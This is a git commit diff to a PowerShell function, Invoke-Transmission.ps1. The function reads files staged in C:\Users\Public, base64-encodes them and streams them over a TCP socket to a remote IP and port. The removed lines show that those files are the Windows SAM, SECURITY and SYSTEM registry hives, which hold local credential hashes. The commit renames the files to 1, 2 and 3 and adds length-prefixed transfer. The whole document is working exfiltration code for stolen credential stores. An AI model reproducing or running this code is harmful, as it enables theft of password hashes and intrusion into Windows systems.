876dc7dc7d8aefc3a55782d51eb7804f905d4209
mo-tec <moritzpfefferkorn@hotmail.com>
2020-11-11 19:11:21 +0100

    Update Invoke-Transmission.ps1

--- Invoke-Transmission.ps1
+++ Invoke-Transmission.ps1
@@ -10,24 +10,30 @@ function Invoke-Transmission {
         [int]
         $port = 9000
     )
-    $Message1 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('C:\Users\Public\sam'))
-    $Message2 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('C:\Users\Public\security'))
-    $Message3 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('C:\Users\Public\system'))
+    $garbagebytes = New-Object byte[] 1
+    $Message1 = [text.Encoding]::Ascii.GetBytes([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('C:\Users\Public\1')))
+    $Message2 = [text.Encoding]::Ascii.GetBytes([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('C:\Users\Public\2')))
+    $Message3 = [text.Encoding]::Ascii.GetBytes([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('C:\Users\Public\3')))
+    $length1 = [text.Encoding]::Ascii.GetBytes($Message1.Length)
+    $length2 = [text.Encoding]::Ascii.GetBytes($Message2.Length)
+    $length3 = [text.Encoding]::Ascii.GetBytes($Message3.Length)
     do{
         try   { $client = New-Object System.Net.Sockets.TcpClient $ip, $port } 
         catch { Sleep 1;Write-Host Connecting... }
     } while (-not $client.Connected)
     $stream = $client.GetStream()
-    $data = [text.Encoding]::Ascii.GetBytes($Message1)
-    $stream.Write($data,0,$data.length)
-    $garbagebytes = New-Object byte[] 10
-    $garbage = $stream.read($garbagebytes, 0, $garbagebytes.Length)
-    $data = [text.Encoding]::Ascii.GetBytes($Message2)
-    $stream.Write($data,0,$data.length)
-    $garbagebytes = New-Object byte[] 10
-    $garbage = $stream.read($garbagebytes, 0, $garbagebytes.Length)
-    $data = [text.Encoding]::Ascii.GetBytes($Message3)
-    $stream.Write($data,0,$data.length)
+    sleep 1
+    $stream.Write($length1,0,$length1.Length)
+    $stream.read($garbagebytes, 0, $garbagebytes.Length)
+    $stream.Write($length2,0,$length2.Length)
+    $stream.read($garbagebytes, 0, $garbagebytes.Length)
+    $stream.Write($length3,0,$length3.Length)
+    $stream.read($garbagebytes, 0, $garbagebytes.Length)
+    $stream.Write($Message1,0,$Message1.Length)
+    $stream.read($garbagebytes, 0, $garbagebytes.Length)
+    $stream.Write($Message2,0,$Message2.Length)
+    $stream.read($garbagebytes, 0, $garbagebytes.Length)
+    $stream.Write($Message3,0,$Message3.Length)
     $client.Close()
     $client.Dispose()
     Write-Host Finished
